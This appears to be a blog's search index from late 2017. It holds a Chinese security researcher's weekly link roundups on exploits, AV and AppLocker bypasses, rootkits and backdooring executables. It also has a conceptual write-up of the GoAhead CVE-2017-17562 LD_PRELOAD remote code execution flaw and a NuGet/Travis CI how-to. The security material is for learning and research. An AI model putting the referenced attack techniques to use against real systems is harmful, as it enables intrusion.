<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[20171225安全动态]]></title>
    <url>%2F2017%2F12%2F25%2F20171225%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"></content>
  </entry>
  <entry>
    <title><![CDATA[有关CVE-2017-17562的一些零碎点]]></title>
    <url>%2F2017%2F12%2F24%2FCVE-2017-17562%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9B%B6%E7%A2%8E%E7%82%B9%2F</url>
    <content type="text"><![CDATA[TL;DR 前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1247)以及shellshock漏洞(CVE-2014-6271),前两天只是简单的看了一下，今天有时间就整理一下，留个备忘。 goAHead是一个使用c语言实现的一个简单web服务器，主要用在嵌入式设备上，官方给出的一句话描述也是simple，secure Embedded web server，官方说有亿万的设备在使用(夸张了吧？)，其中有像是hp、oracle、西门子、摩托罗拉等。详细可以看向这里https://embedthis.com/goahead/CVE-2016-1247简单介绍 这个漏洞可以导致GoAhead web服务器在小于3.6.5版本远程代码执行。攻击者通过发送一个恶意的http请求，利用开启了CGI功能的goAhead的服务器，从而进行远程代码执行。其中exp是利用到了向新的进程中注入环境变量这种比较基本的攻击方式。 具体需要的条件主要有如下：1.GoAhead开启CGI功能，即有cgi的处理页面(关于goAhead cgi的使用可以看向这里https://embedthis.com/goahead/doc/users/cgi.html)2.需要GoAhead版本低于3.6.53.需要动态链接glibc库(默认是动态链接的)具体 在英文原版文章中作者已经分析了glibc是如何加载和处理环境变量、goAhead如何处理cgi以及linux的procfs的符号链接如何指向输入描述符等，我这里就不细分析了。下面只是放几张测试的图片。可以看到，打过payload之后，页面返回的环境变量多了一个LD_PRELOAD=/proc/self/fd/0的键值对。可以看到，cgi处理进程符号链接指向的tmp文件和我们的payload是相同的。小结 这个漏洞利用的难点在于怎么将动态链接库注入到远程服务器，作者这里提供了一个很好的思路就是利用到了/proc/self/fd/0（它对应了文件的stdin文件描述符）这个文件就链接到了我们上传的文件 就像英文原版文章的标题一样，这个漏洞的精髓就是利用ld_preload来进行exploit，这个思路很新颖，后面可能会有其它的漏洞用到这个思路和方法。漏洞引申1-有关nginx提权 漏洞分析文章见这里Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-12471作者的poc shell脚本写的不错 Nginx权限提升漏洞(CVE-2016-1247) 分析 之前简单研究过nginx的提权漏洞，和这次的漏洞有一些像，也用到了环境变量，nginx的这个漏洞用到了写入恶意动态链接库路径到/etc/ld.so.preload。漏洞引申2-有关shellshock 对比shellshock，这个漏洞要需要的条件苛刻很多，shellshock简单粗暴，而且shellshock的影响范围也更广。Shellshock漏洞回顾与分析测试 - Debug_Orz漏洞引申3-其它 在github上看这个项目的一些cve issue https://github.com/embedthis/goahead/issues?page=1&amp;q=label%3Acve+is%3Aclosed还是有很多东西值得学习的(基本上可以看到开发一个web服务器可能会遇到的安全问题）比如这个issue https://github.com/embedthis/goahead/issues/241中，某位安全研究员提的报告https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html As I’m a fan of looking at the source –author 向作者学习，安全有个好处就是我们可以透过现象看本质，研究原理很有意思。 有关patch，原文中作者也说了，漏洞的修复只是过滤了几个特殊的参数名，有可能会被绕过，期待被大牛们绕过的思路。ReferenceREMOTE LD_PRELOAD EXPLOITATION]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171218安全动态]]></title>
    <url>%2F2017%2F12%2F18%2F20171218%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每周安全动态 漏洞利用缓解技术之数据执行保护(DEP)https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634 SHADOW ON THE WALL - Shadowsocks 流量的检测、解密、与命令执行漏洞https://x41-dsec.de/security/news/2017/12/18/x41-shadow-on-the-wall/ 基于r2的逆向基础 radare2https://sec.xiaomi.com/article/30 shell中&gt;/dev/null 2&gt;&amp;1是什么鬼？http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&amp;1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/ 1学习了 Invoke-Obfuscation 用例指南 Part 2http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide-part-2 merlin - 使用 HTTP 通信的跨平台后渗透测试工具https://github.com/Ne0nd0g/merlin ropa - 基于 Ropper 实现的一个 GUI 版本的 ROP 链构造工具https://github.com/orppra/ropa remote ld_preload exploitationhttps://www.elttam.com.au/blog/goahead/]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171211安全动态]]></title>
    <url>%2F2017%2F12%2F11%2F20171211%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每周安全动态 Exploiting Techniques \000 - ret2libchttps://0x00sec.org/t/exploiting-techniques-000-ret2libc/1833 Linux Kernel 4.10.5 /]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171204安全动态]]></title>
    <url>%2F2017%2F12%2F04%2F20171204%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[编写简单 Linux 内核模块的实例https://blog.sourcerer.io/writing-a-simple-linux-kernel-module-d9dc3762c234 XXE OOB extracting via HTTP+FTP using single opened porthttps://skavans.ru/en/2017/12/02/xxe-oob-extracting-via-httpftp-using-single-opened-port/ ProcessIsolator - Hook SSDT 将控制权交给用户态程序实现访问控制（允许/拒绝）的工具https://github.com/int0/ProcessIsolator 钓鱼邮件威胁检测实战及典型样本分析https://www.anquanke.com/post/id/88145 由结构体对齐所引发的对C++类对象内存模型的思考https://bbs.pediy.com/thread-222967.htm 1Nice 通过在函数 Prologue 部分检测 0xE9 (opcode JMP) 实现对 Inline Hook 的检测https://userpc.net/2017/12/03/understanding-detecting-inline-hooks-winapi-hooks-ring3/ Windows Defender ATP 利用机器学习和 AMSI 接口对抗基于脚本的攻击https://blogs.technet.microsoft.com/mmpc/2017/12/04/windows-defender-atp-machine-learning-and-amsi-unearthing-script-based-attacks-that-live-off-the-land/?platform=hootsuite 微软关于 Windows 特权访问防护的手册，其中介绍了不同的登陆类型（console、RUNAS、Remote Desktop、Net use * \SERVER 等等）及其限制 逆向工程师一直受到汇编垃圾代码（Junk Code）的折磨，FireEye 这篇 Blog 介绍如何识别 Junk Codehttps://www.fireeye.com/blog/threat-research/2017/12/recognizing-and-avoiding-disassembled-junk.html 堆利用之单字节溢出（off-by-one）https://www.anquanke.com/post/id/88961 警惕Ubuntu APT源污染https://paper.seebug.org/270/ 1像是yum brew apt nuget pip npm等这些安装依赖的工具，进行攻击作为研究角维度 FruityWifi - 一款无线网络安全审计工具https://github.com/xtr4nge/FruityWifi Mailsploit - 邮箱客户端的漏洞利用工具套件，集成了 30 款主流邮箱客户端（Apple Mail、Thunderbird、Yahoo! Mail、ProtonMail 等）的漏洞https://www.mailsploit.com/index CIA Vault7 RDB中的Windows后门利用方法分析https://3gstudent.github.io/3gstudent.github.io/CIA-Vault7-RDB中的Windows后门利用方法分析/ 渗透技巧——Windows系统的帐户隐藏https://3gstudent.github.io/3gstudent.github.io/渗透技巧-Windows系统的帐户隐藏/ 有效的隐藏红队基础设施的方法https://posts.specterops.io/designing-effective-covert-red-team-attack-infrastructure-767d4289af43 very_overflow的wphttp://blog.csdn.net/niexinming/article/details/78724256 剖析虚拟内存：堆栈，寄存器和汇编代码https://blog.holbertonschool.com/hack-virtual-memory-stack-registers-assembly-code/ rematch - 一款二进制 diff 工具https://github.com/nirizr/rematch]]></content>
  </entry>
  <entry>
    <title><![CDATA[NuGet和travis实践]]></title>
    <url>%2F2017%2F11%2F29%2FNuGet%E5%92%8Ctravis%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[S;CR工作中接触到了yara，yara项目在windows上编译是通过vs2015编译的，其中用到了openssl和jansson的第三方库，其中作者Victor M. Alvarez用的是nuget进行三方库管理的，感觉这个解决方案还不错，可能比自己去下载源码编译lib稍微方便一点儿，所以记录一下。 vs Solution实际测试 下面就以openssl库为例进行一下测试。 首先需要在项目的根目录下创建一个NuGet.Config 的文件,这个应该是方便vs的NuGet进行索引 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;configuration&gt; &lt;packageSources&gt; &lt;add key=&quot;YARA.OpenSSL&quot; value=&quot;https://ci.appveyor.com/nuget/openssl-oaib8n7lvvtp&quot; /&gt; &lt;add key=&quot;YARA.Jansson&quot; value=&quot;https://ci.appveyor.com/nuget/jansson-41we82mn284d&quot; /&gt; &lt;/packageSources&gt;&lt;/configuration&gt; vs的默认项目会带一个界面，可以直观的去下载，如下图。然后在项目中添加一下头文件的路径以及静态链接库的路径就可以使用了。 vs的cmake项目vs的cmake项目稍微有些不同，就是他没有图形界面，这个时候可以使用Package Manager Console来进行查找和下载第三方库。官方说明使用Find-Package openssl 进行搜索，可以发现有很多使用Install-Package YARA.OPENSSL.X64 命令进行下载效果是一样的，都会在项目的主目录的下面创建一个packages的目录并就对应的库下载到其中。这个时候就可以通过CmakeLists.txt进行头文件以及静态链接库的包含就可以使用了更新：cmake的项目在install-package的时候会找不到default solution的问题，所以只能通过将之前下载的packages的内容复制到cmake的项目下了。CMakeLists.txt的内容如下：12345678cmake_minimum_required(VERSION 3.8)include_directories(&quot;$&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/include&quot;)set(libcrypto $&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/lib/libcrypto.lib)set(libssl $&#123;PROJECT_SOURCE_DIR&#125;/packages/YARA.OpenSSL.x86.1.1.0/lib/libssl.lib)add_executable(Demo test.cpp)target_link_libraries(Demo $&#123;libcrypto&#125; $&#123;libssl&#125;) 测试通过。代码已上传至Githubhttps://github.com/kevien/democode 打包自己的package yara项目中openssl库是作者自己打包到appveyor上的，那是如何上传自己打的包呢 nuget包的制作可以通过 NuGetPackageExplorer link这个工具还是挺方便的。 而且这个工具还可以进行上传，如下图所示 当然也可以直接使用nuget工具进行上传 这样我们就完成了自定义包的上传。(现在的方式还是需要进行验证的，也就是需要输入appveyor的用户名和密码，public的方式暂时还没找到方法)利用travis进行持续化集成 首先在github创建一个token，并赋予适当的权限。可参考如下链接https://blog.wyrihaximus.net/2015/09/github-auth-token-on-travis/https://docs.travis-ci.com/user/github-oauth-scopes/ 然后在github的项目当中添加.travish.yml 文件，可参考https://docs.travis-ci.com/user/deployment/releases/ 测试项目https://github.com/kevien/travisTest/12部署的时候有几个坑(MDZZ)，一个是file 的位置，这个会在travis的job log的展开中看到(看log、看log、看log)。第二个就是要在deploy项下加上键值 skip_cleanup: true 总结 用NuGet进行第三方库的操作还是比较方便的,还有就是开源项目的持续集成使用travis工具是个不错的选择。]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171127安全动态(以后每个星期更了)]]></title>
    <url>%2F2017%2F11%2F27%2F20171127%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每周安全动态 RECon 2017 会议的演讲视频公开了https://recon.cx/2017/montreal/recordings/ Linux x64 系统中的 Egg Hunting（搜寻长的 Shellcode 并执行）技巧https://pentesterslife.blog/2017/11/24/x64-egg-hunting-in-linux-systems/ 自动化动态恶意软件分析中的逃逸与反逃逸技术调查（Paper）https://github.com/bulaza/Publications/blob/master/ROOTS2017/A%20Survey%20On%20Automated%20Dynamic%20Malware%20Analysis%20Evasion%20and%20Counter-Evasion.pdf TLS-Redirection - TLS 重定向攻击介绍文档https://github.com/GrrrDog/TLS-Redirection Apache Guacamole - 一款开源的远程桌面网关，支持通过浏览器访问你远程的服务器,thanks html5https://guacamole.apache.org/ CryKeX - Linux内存加密密钥提取工具https://github.com/cryptolok/CryKeX RamFuzz - 基于深度神经网络、自动化生成单元测试用例的 C++ 代码 Fuzzinghttps://github.com/dekimir/RamFuzz/blob/master/sci/ramfuzz.md linux-explorer - 用于 Linux 现场取证的工具箱https://github.com/intezer/linux-explorer OpenATS续篇：搭建自己的卫星地球站http://www.freebuf.com/articles/wireless/153793.html 玄武的每日安全动态 上放了好多ipv6的研究文章https://weibo.com/ttarticle/p/show?id=2309404179032190099080 TensorFlow自动识别验证码https://mp.weixin.qq.com/s/J9vjaoClzBbR4oigusNdpw Gets You Root，Objective-See 研究员对昨天爆出的 macOS ROOT 空密码提权 Bug 的分析https://objective-see.com/blog/blog_0x24.html Hacking 智能家居设备，来自 H2HC 2017https://goo.gl/VeV9Nf stacks-cli - 用于一键分析网站所用技术栈的命令行工具https://github.com/WeiChiaChang/stacks-cli malsub - 用于在线恶意软件分析和威胁情报服务的 Python RESTful API 框架https://github.com/diogo-fernan/malsub?utm_content=buffer51301&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer oni-probe - 网络干扰检测工具https://github.com/TheTorProject/ooni-probe SpookFlare - Meterpreter 加载器生成工具，可绕过客户端与网络端防御https://github.com/hlldz/SpookFlare 通过 KPROCESS 结构的 InstrumentationCallback 域实现 Hookhttps://secrary.com/Random/InstrumentationCallback 浅谈一下mshta在CVE-2017-11882里的命令构造http://www.freebuf.com/articles/web/155304.html Windows 10新子系统*新挑战（看雪2017安全开发者峰会演讲回顾0x9）https://mp.weixin.qq.com/s/CLw5LVg_Gq1qLW8TSKcYYw]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171121安全动态]]></title>
    <url>%2F2017%2F11%2F21%2F20171121%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[每日安全动态 如何在 Windows PE 文件中植入一个无法检测到的后门https://haiderm.com/fully-undetectable-backdooring-pe-files/ Linux 内核 net/ipv4/inet_connection_sock.c inet_csk_clone_lock Double Free 漏洞（CVE-2017-8890）PoChttps://github.com/hardenedlinux/offensive_poc/tree/master/CVE-2017-8890 使用递归攻击未初始化变量https://signal11.io/index.php/2017/11/19/attacking-uninitialized-variables-with-recursion/ 使用 SCF 文件窃取用户 Hashhttps://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/ Meterpreter 渗透框架的 getsystem 命令是如何夺取 SYSTEM 权限的 CVE-2017-11882https://github.com/embedi/CVE-2017-11882 burp-molly-scanner - 将 BurpSuite 变成 Headless 的 Web 应用漏洞扫描器https://github.com/yandex/burp-molly-scanner/ 使用 XSS 窃取 CSRF Tokenhttps://digi.ninja/blog/xss_steal_csrf_token.php 微软提供了一个 Windows 10 开发环境虚拟机，里面预装了 SDK、Visual Studio、Bash on Ubuntu on Windows 等等https://developer.microsoft.com/en-us/windows/downloads/virtual-machines 利用 WMI 进行 C＆C 通信https://pentestlab.blog/2017/11/20/command-and-control-wmi/ Windows 下载远程 Payload 并执行任意代码的教程https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/ 1之前好像看过中文的 在 Windows 环境中追查凭证导出的痕迹，来自 2017 ZeroNightshttps://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment Finding RCE in HP’s Printer Fleethttps://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/ 颠覆windows的信任体系——实现任意代码签名劫持https://mp.weixin.qq.com/s/LCo7elFjGzZIVTA4DDuD8Q bincat - 一款二进制代码静态分析器https://securityonline.info/bincat-binary-code-static/ docker-cuckoo - 将 Cuckoo Sandbox 封装进 Dockerhttps://github.com/blacktop/docker-cuckoo Ring3 / Ring0 Rootkit Hook Detection 1/2http://www.pentestingexperts.com/ring3-ring0-rootkit-hook-detection-1-2/ The Art of Fuzzing – slides and demoshttps://sec-consult.com/en/blog/2017/11/the-art-of-fuzzing-slides-and-demos/index.html 测试主流 Web 服务器（IIS、Apache、Nginx）在处理文件上传时的文件类型黑白名单问题https://mike-n1.github.io/ExtensionsOverview From Markdown to RCE in Atomhttps://statuscode.ch/2017/11/from-markdown-to-rce-in-atom/ SSF - 在 TLS 隧道下提供 TCP/UDP 端口转发、SOCKS5 代理以及远程 Shell 的工具https://github.com/securesocketfunneling/ssf Sysmon v6.20 发布，新增了一个改变服务和驱动名称的功能，可以避免恶意软件通过名字判断 Sysmon 的存在 CRLF 头注入与任意 URL 跳转漏洞利用技巧&lt; https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies&gt; Windows 交互式会话数字取证研究https://countuponsecurity.com/2017/11/22/digital-forensics-artifacts-of-interactive-sessions/ 使用 DNS 打破 AWS 云环境中的隔离网络https://dejandayoff.com/using-dns-to-break-out-of-isolated-networks-in-a-aws-cloud-environment/ 网络犯罪分子如何滥用聊天平台 API 作为C&amp;C 通信的基础设施https://documents.trendmicro.com/assets/wp/wp-how-cybercriminals-can-abuse-chat-platform-apis-as-cnc-infrastructures.pdf Mitre 组织创建了一个称作 ATT&amp;CK 的项目，之前有过推送，这个项目整理了攻击和入侵者常用的一些技术和策略。看到这个项目之后，来自 Veramine 团队的研究员也创建了一个项目，用于总结和讨论如何检测和防御 ATT&amp;CK 项目中涉及的攻击技术https://github.com/veramine/Detections/wiki Ursnif 变种利用 TLS Callback 技术实现进程注入https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html1有源码]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171115安全动态]]></title>
    <url>%2F2017%2F11%2F15%2F20171115%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[安全动态 rootkit - 针对 Ubuntu 16.04 和 10.04 的 rootkithttps://github.com/nurupo/rootkit 从 PE 文件结构角度出发，如何手动植入后门http://www.abatchy.com/2017/05/introduction-to-manual-backdooring_24.html osquery 是 Facebook 开源的一款基于 SQL 的操作系统检测和监控框架。前两天推送过一篇《各个团队都是如何使用 osquery 的》。今天 Palantir 团队这篇 Blog 介绍如何部署和配置 osquery 框架&#104;&#116;&#116;&#x70;&#115;&#x3a;&#x2f;&#x2f;&#109;&#x65;&#x64;&#105;&#117;&#x6d;&#x2e;&#x63;&#x6f;&#109;&#47;&#x40;&#x70;&#x61;&#108;&#97;&#x6e;&#116;&#105;&#114;&#47;&#x6f;&#x73;&#x71;&#117;&#x65;&#114;&#121;&#x2d;&#x61;&#x63;&#114;&#111;&#x73;&#115;&#45;&#116;&#104;&#101;&#x2d;&#101;&#110;&#x74;&#x65;&#114;&#112;&#x72;&#105;&#115;&#101;&#45;&#51;&#99;&#x33;&#x63;&#57;&#x64;&#49;&#x33;&#x65;&#x63;&#53;&#53; 使用 Windows Defender ATP 检查反射型 DLL 加载https://blogs.technet.microsoft.com/mmpc/2017/11/13/detecting-reflective-dll-loading-with-windows-defender-atp/?ocid=cx-twitter-mmpc Windows 系统中的安全软件的 Bypass 策略。从特征检测、行为检测、信誉评估检测三个方向讨论对应的 Bypass 方法https://artofpwn.com/spookflare.html PowerKrabsEtw - 用于实时 ETW(事件日志) Trace 的 PowerShell 模块，基于微软的 krabsetw 库实现https://github.com/zacbrown/PowerKrabsEtw 如何制作一个低成本的间谍植入器件https://ha.cking.ch/s8_data_line_locator/ CVE-2017-5123 漏洞利用全攻略https://paper.seebug.org/451/ iny-URL-Fuzzer - 台湾研究员 Orange Tsai 开源的一款 URL Fuzzer，之前他在 BlackHat 会议分享了一个相关的议题 wget HTTP 整型溢出漏洞（CVE-2017-13089）https://xorl.wordpress.com/2017/11/11/cve-2017-13089-wget-http-integer-overflow/ 利用合法工具来隐藏恶意代码https://securelist.com/using-legitimate-tools-to-hide-malicious-code/83074/ SpookFlare - Meterpreter 加载器生成工具，可绕过客户端和网络端的防御https://github.com/hlldz/SpookFlare CouchDB漏洞(CVE–2017–12635, CVE–2017–12636)分析http://bobao.360.cn/learning/detail/4716.html wget 缓冲区溢出漏洞分析（CVE-2017-13089）https://paper.seebug.org/453/ 1这个可以详细的研究一下 隐写术，恶意软件的避风港https://securityintelligence.com/steganography-a-safe-haven-for-malware/ MalwareBenchmark又爆0-day涉及yaml语言：CVE-2017-16615https://mp.weixin.qq.com/s/ecEB-SCowg8dINrpwt7X9w RPCForge - Windows RPC Python fuzzerhttps://github.com/sogeti-esec-lab/RPCForge 应用白名单绕过：mshta.exehttps://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-mshta-exe/ 应用白名单绕过：regsvr32.exehttps://blog.conscioushacker.io/index.php/2017/11/17/application-whitelisting-bypass-regsvr32-exe/ idaplugins-list - 一份 IDA Plugin列表https://github.com/onethawt/idaplugins-list/blob/master/README.md1谁来整理个burpsuite的插件列表 其它发现刷github的首页要比刷twitter更有意思]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171106安全动态]]></title>
    <url>%2F2017%2F11%2F06%2F20171106%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[安全动态 PROPagate - 基于 SetWindowSubclass API 的代码注入新技巧http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/ 构建一个神经网络，从原始字节序列的角度检测恶意软件https://arxiv.org/abs/1710.09435 利用BDF向EXE和DLL文件植入后门https://3gstudent.github.io/3gstudent.github.io/利用BDF向EXE文件植入后门/https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/ 1也就是说往正规软件中植入后门成本还是很低的，都可以工具化了的、 DriverMon - 监控驱动活动的工具，最近更新的版本可以记录 DeviceIoControl 和 IRP Datahttps://github.com/zodiacon/DriverMon node.js + postgres 从注入到Getshellhttps://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html SafeBreach Labs 研究员开源了一个恶意软件 Two-Stage Dropper 生成器http://www.ikotler.org/MalwaresFromThinBits.pdf 从汇编代码中看 Windows 64 位的 SEH（Structured Exception Handling）实现https://www.codeproject.com/Articles/1212332/bit-Structured-Exception-Handling-SEH-in-ASM 任天堂 Switch 逆向工程https://github.com/dekuNukem/Nintendo_Switch_Reverse_Engineering 恶意子域名接管工具Subjackhttps://github.com/haccer/subjack 绕过现代的进程检测机制http://riscy.business/2017/11/bypassing-modern-process-hollowing-detection/ 接管Instagram账户https://stefanovettorazzi.com/taking_over_instagram_accounts/ AppLocker绕过列表https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/README.md Windows 平台多个 Crypter 恶意软件样本的收集https://github.com/malwares/Crypter 利用 FwCplLua COM 接口和 mscfile 注册表键劫持的方法 Bypass UAC，来自 hfiref0x 分享的 PoC 代码https://gist.github.com/hfiref0x/a044cb0ad425488e38556408b179cb61 通过像素颜色值编码数据以实现渗透测试中的数据回传https://www.pentestpartners.com/security-blog/exfiltration-by-encoding-data-in-pixel-colour-values/ 建立活动目录中的密罐账户https://jordanpotti.com/2017/11/06/honey-accounts/ Striker - 信息收集与漏洞扫描工具https://github.com/UltimateHackers/Striker 深渊背后的真相之薅羊毛产业报告http://www.freebuf.com/news/152525.html Node.js CVE-2017-14849 漏洞分析https://security.tencent.com/index.php/blog/msg/121 ctf中 可执行文件patch技术https://bbs.pediy.com/thread-222623.htm 当第三方组件变成邪恶之源https://1drv.ms/p/s!Al6ImNZd5mQmeK39RoVxiJ5re8Y glibc malloc学习笔记之fastbinhttps://paper.seebug.org/445/ Hyper-V安全从0到1https://bbs.pediy.com/thread-222626.htm Drexel One API逆向工程&#104;&#x74;&#116;&#x70;&#x73;&#58;&#x2f;&#x2f;&#x6d;&#x65;&#x64;&#x69;&#x75;&#x6d;&#x2e;&#x63;&#111;&#109;&#47;&#x40;&#x74;&#x6f;&#x6d;&#x65;&#x72;&#x73;&#104;&#x65;&#109;&#x65;&#115;&#104;&#x2f;&#114;&#101;&#118;&#x65;&#114;&#x73;&#101;&#x2d;&#101;&#x6e;&#x67;&#105;&#x6e;&#x65;&#x65;&#114;&#105;&#x6e;&#103;&#45;&#x74;&#x68;&#101;&#x2d;&#x64;&#x72;&#x65;&#x78;&#x65;&#108;&#x2d;&#x6f;&#110;&#x65;&#45;&#97;&#x70;&#x69;&#45;&#51;&#x37;&#48;&#x61;&#53;&#54;&#48;&#x61;&#102;&#101;&#x64;&#x66; 1mac上的逆向 信息安全Cheat Sheetshttps://www.cybrary.it/0p3n/infosec-cheat-sheets/ 新近出现的提权框架https://github.com/spencerdodd/kernelpop Windows利用开发四：SEH覆写http://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html DCOM与DDE的奇妙结合https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom 二进制代码的模糊测试&#104;&#116;&#116;&#112;&#x73;&#58;&#x2f;&#47;&#109;&#x65;&#x64;&#x69;&#117;&#x6d;&#46;&#99;&#x6f;&#109;&#x2f;&#64;&#x6e;&#106;&#118;&#x6f;&#115;&#x73;&#50;&#57;&#x39;&#x2f;&#x61;&#102;&#108;&#45;&#117;&#x6e;&#x69;&#99;&#111;&#114;&#110;&#45;&#x66;&#117;&#122;&#122;&#105;&#110;&#x67;&#45;&#x61;&#114;&#x62;&#x69;&#x74;&#x72;&#97;&#114;&#x79;&#x2d;&#x62;&#x69;&#x6e;&#97;&#114;&#x79;&#45;&#99;&#x6f;&#x64;&#x65;&#45;&#53;&#54;&#x33;&#99;&#97;&#x32;&#x38;&#x39;&#51;&#54;&#98;&#x66;]]></content>
  </entry>
  <entry>
    <title><![CDATA[20171030安全动态]]></title>
    <url>%2F2017%2F10%2F30%2F20171030%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81%2F</url>
    <content type="text"><![CDATA[安全动态 长亭科技利用 SQLite 漏洞攻击 Safari 的细节（ZDI-15-570, ZDI-17-360, ZDI-17-366, ZDI-17-367, ZDI-17-368, and ZDI-17-369）https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf 使用 Voltage Fault Injection 实现 Linux 本地提权(Paper)https://www.riscure.com/uploads/2017/10/Riscure_Whitepaper_Escalating_Privileges_in_Linux_using_Fault_Injection.pdf Crypton - F5 Networks 研究员开发的一个工具，用于解密恶意样本中的加密内容，提高恶意软件逆向分析效率：https://www.virusbulletin.com/blog/2017/10/vb2017-paper/ Stage-RemoteDll - 用 PowerShell 实现 NtCreateThreadEx/ QueueUserAPC/ SetThreadContext/ SetWindowsHookEx DLL 注入技术https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Stage-RemoteDll.ps1 1不知道是不是一个绕过av的方法 使用 XSS 绕过 CSRF 防御https://dl.packetstormsecurity.net/papers/attack/Using_XSS_to_bypass_CSRF_protection.pdf 正则表达式基础库源码审计与漏洞分析http://www.freebuf.com/vuls/151430.html 1web安全很多的绕过都是绕过正则规则的 如何安全地将你的文件藏在图片中http://hackingnewstutorials.com/how-to-safely-hide-your-files-and-folders-inside-images/ mashing the Stack for Fun &amp; Profit : Revivedhttps://avicoder.me/papers/pdf/smashthestack.pdf Powershell Empire 绕过AV实现远控http://bobao.360.cn/learning/detail/4628.html hack with github 编选的 10 月份 Top 5 安全工具https://medium.com/hack-with-github/top-5-security-tools-october-2017-76ab31834efd 把一个恶意样本 PE 文件头部的 “This program cannot be run in DOS mode” 中的 “This” 改为 “That”，可以 Bypass 11 款杀软https://twitter.com/zerosum0x0/status/925486850399019009/photo/1 揭秘：两张A4纸破解虹膜、人脸识别，百度安全技术小哥怎么做到的？https://mp.weixin.qq.com/s/zq7D8YzjljJ8rsteib1ljA Google Bug Tracker 存在漏洞可越权查看未修复漏洞的报告https://threatpost.com/flaw-in-google-bug-tracker-exposed-reports-about-unpatched-vulnerabilities/128687&#x68;&#116;&#116;&#x70;&#115;&#x3a;&#x2f;&#x2f;&#109;&#x65;&#x64;&#105;&#x75;&#x6d;&#x2e;&#99;&#x6f;&#109;&#47;&#64;&#x61;&#x6c;&#101;&#120;&#x2e;&#x62;&#105;&#114;&#115;&#x61;&#x6e;&#x2f;&#109;&#x65;&#x73;&#115;&#x69;&#110;&#103;&#x2d;&#119;&#x69;&#116;&#x68;&#45;&#116;&#104;&#101;&#45;&#x67;&#111;&#111;&#103;&#108;&#x65;&#45;&#98;&#117;&#103;&#x61;&#110;&#x69;&#x7a;&#x65;&#x72;&#x2d;&#x73;&#121;&#115;&#x74;&#101;&#x6d;&#x2d;&#x66;&#111;&#114;&#45;&#x31;&#53;&#x2d;&#x36;&#48;&#48;&#x2d;&#x69;&#110;&#x2d;&#x62;&#111;&#x75;&#110;&#x74;&#105;&#101;&#x73;&#x2d;&#x35;&#56;&#102;&#x38;&#54;&#99;&#x63;&#57;&#x66;&#x39;&#x61;&#x35; Office-DDE-Payloads - 生成嵌入 DDE 的 恶意 Office 文档的脚本https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads Ironsquirrel - 以加密的方式将浏览器漏洞利用代码发往受害者浏览器的工具https://github.com/MRGEffitas/Ironsquirrel LIEF - 之前推送过这个工具，QuarksLab 开源的一个跨平台可执行文件格式（PE/ELF/MachO）的解析、修改、抽象库，QuarksLab 昨天更新了一篇介绍 LIEF 库用法的 Bloghttps://blog.quarkslab.com/have-fun-with-lief-and-executable-formats.html 恶意样本分析手册–特殊方法篇http://blog.nsfocus.net/malicious-sample-analysis-manual/ 天翼校园客户端被植入病毒 中毒电脑被用来“挖矿”http://www.freebuf.com/column/152827.html IoT设备通信安全讨论https://cert.360.cn/report/detail?id=5da919662c3c60f5004e513756fc4562 LKM Linux 